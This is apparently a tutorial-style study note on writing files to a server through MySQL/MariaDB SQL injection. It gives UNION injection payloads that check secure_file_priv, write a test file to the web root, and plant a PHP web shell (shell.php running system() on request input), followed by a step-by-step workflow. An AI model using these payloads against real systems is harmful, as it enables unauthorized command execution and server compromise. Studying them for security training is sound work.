## **Writing Files**

**Requirements to Write Files**

To write files using **MySQL/MariaDB**, all **three** of the following conditions must be true:

1. The database user has the **FILE** privilege.
2. The MySQL **secure_file_priv** variable allows writing.
3. The MySQL process has write permission to the target directory.

`secure_file_priv`

`secure_file_priv` is a MySQL global variable that controls **where files can be read from or written to**. Possible values:

| Value | Meaning |
| --- | --- |
| Empty (`""`) | Read/write is allowed anywhere on the filesystem (if the user has the `FILE` privilege). |
| Directory (e.g., `/var/lib/mysql-files`) | Files can only be read/written inside that directory. |
| `NULL` | Reading and writing files is completely disabled. |
- MariaDB by default : `secure_file_priv = ""`
- MySQL by defaule : `/var/lib/mysql-files`

Check : `SHOW VARIABLES LIKE 'secure_file_priv';`

Global MySQL variables are stored in: `information_schema.global_variables`

**QUERY:**

```bash
SELECT variable_name, variable_value
FROM information_schema.global_variables
WHERE variable_name="secure_file_priv";
```

**UNION Injection:**

```bash
cn' UNION SELECT
1,
variable_name,
variable_value,
4
FROM information_schema.global_variables
WHERE variable_name="secure_file_priv"-- -
```

**To write files, MySQL provides:**

```
SELECT ...INTO OUTFILE
```

It is normally used to export query results into a file.

Example: Export a Table:

```bash
SELECT *
FROM users
INTO OUTFILE '/tmp/credentials';
```

**Writing Arbitrary Text**

Instead of exporting a table, we can directly write any string.

Example:

```
SELECT'this is a test'INTO OUTFILE'/tmp/test.txt';
```

**Writing Files Through SQL Injection**

```bash
SELECT 'file written successfully!'
INTO OUTFILE '/var/www/html/proof.txt';
```

**UNION Injection Payload**

```
cn' UNION SELECT
1,
'file written successfully!',
3,
4
INTO OUTFILE '/var/www/html/proof.txt'-- -
```

**SQL Injection Payload**

Replace the previous string with the PHP code and write it to `shell.php`.

Payload:

```
cn' UNION SELECT
"",
'<?php system($_REQUEST[0]); ?>',
"",
""
INTO OUTFILE '/var/www/html/shell.php'-- -
```

**Writing Files Workflow**

```
1. Verify FILE privilege
          ↓
2. Check secure_file_priv
          ↓
3. Confirm write permission to target directory
          ↓
4. Use SELECT ... INTO OUTFILE
          ↓
5. Verify the written file
          ↓
6. (If permitted) Write a PHP web shell
          ↓
7. Execute commands through the web shell
```
